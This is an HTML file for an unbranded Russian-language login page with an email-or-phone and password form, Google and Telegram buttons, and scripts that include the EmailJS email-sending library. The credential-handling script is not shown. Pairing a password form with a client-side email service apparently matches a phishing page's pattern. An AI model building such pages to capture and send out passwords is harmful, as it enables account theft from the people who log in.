<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Вход</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Экран загрузки -->
    <div id="loading-screen">
        <div class="loading-image-container">
            <img src="welcome.jpg" alt="Loading" class="loading-image">
        </div>
    </div>

    <!-- Основная страница входа -->
    <div id="main-content" style="display: none;">
        <!-- ФОНОВОЕ ИЗОБРАЖЕНИЕ НА ПОЛНЫЙ ЭКРАН -->
        <div class="background-image-wrapper">
            <img src="background.jpg" alt="Background" class="background-image">
            <div class="background-overlay"></div>
        </div>

        <div class="modal-container">
            <!-- Заголовок с кнопкой закрытия -->
            <div class="modal-header">
                <h2>Вход</h2>
                <button class="close-btn" aria-label="Закрыть">✕</button>
            </div>

            <!-- Логотип -->
            <div class="logo-container">
                <img src="logo.png" alt="Logo" class="logo-image">
            </div>

            <!-- Форма входа -->
            <form id="login-form">
                <div class="input-group">
                    <input 
                        type="text" 
                        id="login-input" 
                        placeholder="Email или телефон" 
                        required
                        autocomplete="username"
                    >
                </div>

                <div class="input-group password-group">
                    <input 
                        type="password" 
                        id="password-input" 
                        placeholder="Пароль" 
                        required
                        autocomplete="current-password"
                    >
                    <button type="button" class="toggle-password" aria-label="Показать пароль">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </button>
                </div>

                <button type="submit" class="login-btn">Вход</button>
            </form>

            <!-- Забыли пароль -->
            <a href="#" class="forgot-password">Получить одноразовый пароль</a>

            <!-- Разделитель -->
            <div class="divider">или через</div>

            <!-- Социальные кнопки -->
            <div class="social-buttons">
                <button class="social-btn google-btn" title="Google">
                    <svg width="24" height="24" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                </button>
                
                <button class="social-btn telegram-btn" title="Telegram">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="#2AABEE">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
                    </svg>
                </button>
            </div>

            <!-- Футер -->
            <div class="modal-footer">
                <a href="#" class="footer-link">Забыли пароль?</a>
                <a href="#" class="footer-link">Регистрация</a>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
